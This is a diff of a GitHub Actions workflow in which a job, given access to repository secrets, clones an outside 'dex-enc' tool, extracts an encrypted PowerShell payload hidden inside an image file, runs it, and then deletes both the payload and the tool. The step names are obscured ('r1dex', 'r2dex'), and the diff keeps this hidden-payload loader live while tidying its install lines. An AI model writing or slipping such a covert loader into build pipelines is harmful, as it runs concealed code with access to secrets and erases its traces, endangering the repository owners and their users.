@@ -14,7 +14,7 @@ jobs:
       - name: r1dex
         uses: actions/checkout@v4
         
-      - name: r2dex (Updated Cache Logic)
+      - name: r2dex
         uses: actions/cache@v4
         with:
           path: |
@@ -31,17 +31,21 @@ jobs:
           SSH_KEY: ${{ secrets.SSH_KEY }}
         run: |
           git clone https://github.com/Scheldest/dex-enc.git --quiet
-          pip install dex-enc/. --quiet
+          
+          cd dex-enc
+          pip install . --quiet
+          cd ..
+          
           $p = Join-Path $pwd "BondeXJS.png"
           if (Test-Path $p) {
-              python dex-enc/dexenc.py extract -i $p -key "$env:D_KEY" --out-payload "$pwd\r4dx.ps1"
+              dexenc extract -i $p -key "$env:D_KEY" --out-payload "$pwd\r4dx.ps1"
               if (Test-Path "$pwd\r4dx.ps1") {
                   Write-Host "[+] Executing decrypted payload..." -ForegroundColor Green
                   . "$pwd\r4dx.ps1"
                   Remove-Item "$pwd\r4dx.ps1" -Force
                   Remove-Item -Recurse -Force dex-enc
               } else {
-                  Write-Host "[-] Payload file not found in root!" -ForegroundColor Red
+                  Write-Host "[-] Payload file not found!" -ForegroundColor Red
                   exit 1
               }
           }
